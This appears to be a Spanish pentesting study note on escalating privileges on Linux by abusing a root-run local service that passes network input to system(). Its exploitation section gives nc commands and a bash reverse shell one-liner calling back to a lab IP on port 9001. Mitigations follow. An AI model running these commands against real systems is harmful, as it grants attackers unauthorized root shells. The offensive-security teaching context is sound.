
---
# Abuso de servicios internos del sistema

> En los sistemas Linux, los **servicios internos** (o *daemons*) son componentes críticos que operan en segundo plano para gestionar funcionalidades esenciales como la red, impresión, monitoreo, actualizaciones o servicios personalizados. Sin embargo, si alguno de estos servicios está **mal configurado o corre con permisos elevados**, puede representar una **superficie de ataque significativa**.

Desde una perspectiva ofensiva, nuestro objetivo será **identificar un servicio vulnerable**, comprender su función, y posteriormente **determinar si puede ser abusado para escalar privilegios**.

## Enumeración de servicios activos

El primer paso consiste en detectar qué servicios están corriendo en el sistema. Podemos emplear varias herramientas:

```bash
ps aux | grep -v '\['
````

```bash
ss -tulnp
```

```bash
systemctl list-units --type=service
```

También podríamos usar herramientas como `linpeas.sh` o `lse.sh`, que enumeran servicios sospechosos de forma automática.

## Ejemplo práctico: Servicio vulnerable expuesto localmente

Supongamos que durante la enumeración encontramos el siguiente servicio corriendo:

```bash
tcp LISTEN 0 128 127.0.0.1:4444 0.0.0.0:* users:(("vuln_service",pid=1234,fd=3))
```

Al inspeccionarlo, observamos que se trata de un binario personalizado o script interno (`/usr/local/bin/vuln_service`) que **se ejecuta como root**.

## Análisis y explotación

Tras analizar el binario, identificamos que al recibir ciertos datos desde el puerto 4444, ejecuta comandos del sistema sin validación:

```c
system(client_input);
```

Esto representa una **vulnerabilidad crítica de ejecución remota** si conseguimos conectarnos al puerto y enviar comandos.

Usamos `nc` para probarlo:

```bash
nc 127.0.0.1 4444
id
```

Si obtenemos como salida:

```bash
uid=0(root) gid=0(root) groups=0(root)
```

Entonces hemos logrado **ejecutar código como root** y podríamos, por ejemplo, abrir una reverse shell:

```bash
nc 127.0.0.1 4444
bash -i >& /dev/tcp/10.10.14.100/9001 0>&1
```

(Desde nuestro host estaríamos escuchando con `nc -lnvp 9001`)

## Mitigaciones

- Nunca ejecutar servicios personalizados como `root` si no es absolutamente necesario.
    
- Aplicar controles estrictos de entrada/salida en cualquier servicio que procese datos del usuario.
    
- Limitar la superficie de exposición de servicios (por ejemplo, usar `iptables` o `firewalld` para restringir accesos).
    
- Auditar los binarios ejecutables y revisar el uso de funciones peligrosas como `system()`, `exec*()`, etc.
    

## Conclusión

Hemos visto cómo un servicio mal configurado o vulnerable puede convertirse en una puerta de entrada directa para obtener privilegios elevados. Como ofensores, debemos desarrollar una mentalidad analítica para identificar estos vectores y explotarlos con precisión. Como defensores, es crucial implementar controles preventivos, restrictivos y de monitoreo para reducir el impacto de este tipo de vectores.

---
